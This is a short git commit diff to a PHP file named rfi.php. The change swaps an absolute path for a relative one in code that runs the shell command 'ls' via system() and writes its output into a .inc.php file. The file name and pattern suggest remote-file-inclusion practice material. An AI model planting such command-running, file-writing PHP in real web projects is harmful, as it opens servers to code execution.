1a9c3bff7044c5d8350a5cc5015a1eb2927386d5
Siderae <44529983+Siderae@users.noreply.github.com>
2019-03-20 13:59:29 +0200

    Update rfi.php

--- rfi.php
+++ rfi.php
@@ -1,7 +1,7 @@
 <?php 
 $data=system("ls"); 
 #echo $data;
-$filename = "/var/www/posts/first.inc.php";
+$filename = "posts/first.inc.php";
 $file = fopen( $filename, "w" );
 fwrite( $file, $data);
 fclose( $file );
